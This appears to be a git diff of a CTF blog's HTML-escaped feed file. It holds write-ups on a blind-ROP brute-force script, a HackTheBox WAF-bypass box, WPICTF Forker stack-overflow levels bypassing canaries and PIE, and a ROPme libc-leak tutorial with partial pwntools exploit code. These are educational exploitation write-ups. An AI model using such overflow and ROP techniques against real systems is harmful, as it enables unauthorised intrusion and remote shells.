 &lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret_address&lt;/span&gt;
 
-		&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'(chocolate/beer/hamburger): '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'(chocolate/beer/hamburger): '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-		&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-		&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'are out of stock&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'are out of stock&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
 		&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 			&lt;span class=&quot;n&quot;&gt;recved&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;recved&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;recved&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 			&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recved&lt;/span&gt;
 		&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 			&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 			&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
 
 		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Bye!'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recved&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;not_rops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-				&lt;span class=&quot;n&quot;&gt;rops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xfff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;rops&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xfff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 		&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
@@ -1731,7 +1960,7 @@ while not receiving any data &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;After finding the right address for a send function, and the right rop gadgets, we can start &lt;strong&gt;dumping&lt;/strong&gt; libc and the binary from memory for future gadgets like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdx&lt;/code&gt; or we can simply call system function from libc.&lt;/p&gt;
 
-&lt;p&gt;With all this information, building an exploit is trivial, you can find a copy of the binary &lt;a href=&quot;http://localhost:4000/assets/downloads/brop_binary.zip&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="pwning" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">Rooting Fluxcapacitor box</title><link href="http://localhost:4000/2018/05/15/flux.html" rel="alternate" type="text/html" title="Rooting Fluxcapacitor box" /><published>2018-05-15T14:14:06-05:00</published><updated>2018-05-15T14:14:06-05:00</updated><id>http://localhost:4000/2018/05/15/flux</id><content type="html" xml:base="http://localhost:4000/2018/05/15/flux.html">&lt;h2 id=&quot;please-read-the-disclamer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclamer&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;With all this information, building an exploit is trivial, you can find a copy of the binary &lt;a href=&quot;http://localhost:4000/assets/downloads/brop_binary.zip&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="pwning" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">Rooting Fluxcapacitor box</title><link href="http://localhost:4000/2018/05/15/flux.html" rel="alternate" type="text/html" title="Rooting Fluxcapacitor box" /><published>2018-05-15T21:14:06+02:00</published><updated>2018-05-15T21:14:06+02:00</updated><id>http://localhost:4000/2018/05/15/flux</id><content type="html" xml:base="http://localhost:4000/2018/05/15/flux.html">&lt;h2 id=&quot;please-read-the-disclamer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclamer&lt;/a&gt;&lt;/h2&gt;
 
 &lt;p&gt;Hello this a &lt;strong&gt;writeup&lt;/strong&gt; for a box from &lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;HackTheBox&lt;/a&gt; which is focused mainly on &lt;strong&gt;&lt;em&gt;WAF&lt;/em&gt;&lt;/strong&gt; Bypassing.&lt;/p&gt;
 
@@ -1778,289 +2007,4 @@ this can be easily bypassed by adding quotes like the following &lt;code class=&
 
 &lt;p&gt;Easy!, we just have to run this script and give it 2 arguments, the first one must be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd&lt;/code&gt; and the second one our command base64 encoded and we are root !&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/flux_root.png&quot; alt=&quot;flux_root&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="box" /><summary type="html">Please read the disclamer</summary></entry><entry><title type="html">Forker</title><link href="http://localhost:4000/2018/04/16/Forker.html" rel="alternate" type="text/html" title="Forker" /><published>2018-04-16T09:53:06-05:00</published><updated>2018-04-16T09:53:06-05:00</updated><id>http://localhost:4000/2018/04/16/Forker</id><content type="html" xml:base="http://localhost:4000/2018/04/16/Forker.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Hello, in this post I will talk about an exploitation challenge from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WPICTF&lt;/code&gt;, I participated alone in it and I was ranked top 22 just by pwning stuff xD.&lt;/p&gt;
-
-&lt;p&gt;There was 4 levels for this challenge all based on stack exploitation, the difficulty was raising in each &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;level + 1&lt;/code&gt; which means more protections to bypass :D, so let’s start from level1.&lt;/p&gt;
-
-&lt;h1 id=&quot;1-forkerlevel1&quot;&gt;1) Forker.Level1:&lt;/h1&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level1_reverse0.png&quot; alt=&quot;forker_level1_reverse0&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;So our binary initiat a server using sockets, then waits for a client to connect, when it does it calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fork&lt;/code&gt; function, and then runs &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check_password&lt;/code&gt; function, let’s check this latter one.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level1_reverse1.png&quot; alt=&quot;forker_level1_reverse1&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Just a simple buffer overflow, we have our buffer at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BP-0x50&lt;/code&gt; and our index counter at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BP-0x04&lt;/code&gt;, to be able to buffer overflow we have to make sure we don’t overwrite our index_counter with junk, so in short we have to write 76 junk bytes + 8 bytes which represents our index + 4 other junk bytes.&lt;/p&gt;
-
-&lt;p&gt;Running &lt;a href=&quot;https://github.com/slimm609/checksec.sh&quot;&gt;checksec&lt;/a&gt; shows the following:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level1_checksec.png&quot; alt=&quot;forker_level1_checksec&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;simple task right, well not so fast we still have a problem to deal with, so in short we can successfully call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; and pop a shell, cool, but how are we gonna send commands to it and receive its output? it only reads from STDIN and writes to STDOUT haha…, here comes the savior &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dup2&lt;/code&gt; function, let’s check its manual.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level1_dup2.png&quot; alt=&quot;forker_level1_dup2&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Yeah!, we can use this cool function to make a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;I/O redirection&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;so let’s build a rop that calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dup2&lt;/code&gt; to set the correct redirection for input/output, then call for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Here is my &lt;a href=&quot;https://github.com/soolidsnake/Write-ups/blob/master/WPICTF/Forker.1/full_exploit_1.py&quot;&gt;exploit&lt;/a&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;2-forkerlevel2&quot;&gt;2) Forker.Level2:&lt;/h1&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level2_reverse0.png&quot; alt=&quot;forker_level2_reverse0&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Let’s &lt;a href=&quot;https://github.com/slimm609/checksec.sh&quot;&gt;checksec&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level2_checksec.png&quot; alt=&quot;forker_level2_checksec&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;In level2 we have to bypass &lt;a href=&quot;https://fr.wikipedia.org/wiki/Stack-Smashing_Protector&quot;&gt;Stack-Smashing Protector&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Note : when a binary forks it self, the child inherit canary from its parent, it also inherit the loaded in a location address if PIE is enabled&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;The best and easy solution would be to bruteforce the canary byte by byte then overwrite the return address with a rop that pops a shell.&lt;/p&gt;
-
-&lt;p&gt;Here is my &lt;a href=&quot;https://github.com/soolidsnake/Write-ups/blob/master/WPICTF/Forker.2/full_exploit_2.py&quot;&gt;exploit&lt;/a&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;3-forkerlevel3&quot;&gt;3) Forker.Level3:&lt;/h1&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level3_reverse0.png&quot; alt=&quot;forker_level3_reverse0&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;let’s &lt;a href=&quot;https://github.com/slimm609/checksec.sh&quot;&gt;checksec&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level3_checksec.png&quot; alt=&quot;forker_level3_checksec&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This getting harder and harder, now we have to bypass &lt;a href=&quot;https://en.wikipedia.org/wiki/Position-independent_code&quot;&gt;PIE protection&lt;/a&gt; too, my solution was also to brute force the return address.&lt;/p&gt;
-
-&lt;p&gt;Checking the assembly code&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/forker_level3_reverse1.png&quot; alt=&quot;forker_level3_reverse1&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;We see that before returning to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;, it pops a value from the stack to a  global variable named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_sockfd&lt;/code&gt; which is our file descriptor of our connection, so we have to make sure to set its correct value when buffer overflowing.&lt;/p&gt;
-
-&lt;p&gt;Here is my &lt;a href=&quot;https://github.com/soolidsnake/Write-ups/blob/master/WPICTF/Forker.3/full_exploit_3.py&quot;&gt;exploit&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="pwning" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">PWNING ROPME</title><link href="http://localhost:4000/2018/04/14/ropme.html" rel="alternate" type="text/html" title="PWNING ROPME" /><published>2018-04-14T09:53:06-05:00</published><updated>2018-04-14T09:53:06-05:00</updated><id>http://localhost:4000/2018/04/14/ropme</id><content type="html" xml:base="http://localhost:4000/2018/04/14/ropme.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Hello, this is my first post on this website, from now on I will publish tutorials and solutions for the challenges that I complete for educational purpose.&lt;/p&gt;
-
-&lt;p&gt;In this small tutorial we will talk about:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;How to leak an address from libc&lt;/li&gt;
-  &lt;li&gt;How to find the correct version of libc used by the remote target&lt;/li&gt;
-  &lt;li&gt;How to exploit and gain a remote shell&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;We will use a tool called &lt;a href=&quot;https://docs.pwntools.com/en/stable&quot;&gt;pwntools&lt;/a&gt; to write our exploit script, using python as language.&lt;/p&gt;
-
-&lt;p&gt;I chose a challenge proposed by the cyber security community &lt;a href=&quot;https://0x00sec.org&quot;&gt;0x00sec&lt;/a&gt;. so let’s get right into it.&lt;/p&gt;
-
-&lt;h1 id=&quot;reversing-part&quot;&gt;Reversing part:&lt;/h1&gt;
-
-&lt;p&gt;The binary is a simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELF 64-bit dynamically linked&lt;/code&gt; let’s check its protections.&lt;/p&gt;
-
-&lt;p&gt;Using &lt;a href=&quot;https://github.com/slimm609/checksec.sh&quot;&gt;checksec&lt;/a&gt; we see that stack smashing protection is disabled.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/ropme_checksec.png&quot; alt=&quot;ropme_checksec&quot; /&gt;&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__cdecl&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+10h] [bp-40h]&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ROP me outside, how 'about dah?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1F4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;we notice that the length of the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt; is 0x40 but &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fgets&lt;/code&gt; reads 0x1F4 bytes from STDIN, which means we can overwrite the return address !.&lt;/p&gt;
-
-&lt;h1 id=&quot;leaking-part&quot;&gt;Leaking part:&lt;/h1&gt;
-
-&lt;p&gt;Our first goal is to leak 2 different libc function addresses, to do so, we will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; function to print .got entries, I chose to leak &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fgets&lt;/code&gt; addresses.&lt;/p&gt;
-
-&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb&lt;/code&gt; we find that after 72 bytes we can overwrite the return address, time to build a small rop gadget to call puts and print .got entries, for this we need to find a gadget that puts data into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RDI&lt;/code&gt; something like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop RDI; ret&lt;/code&gt; would be cool, using &lt;a href=&quot;https://github.com/JonathanSalwan/ROPgadget&quot;&gt;ROPgadget&lt;/a&gt; on the binary we get :&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/ropme_rop_gadget.png&quot; alt=&quot;ropme_rop_gadget&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;With all this information we can write a small script to extract &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fgets&lt;/code&gt; addresses.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./ropme'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;pop_rdi_ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4006d3&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'127.0.0.1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# connect to the remote service
-&lt;/span&gt;
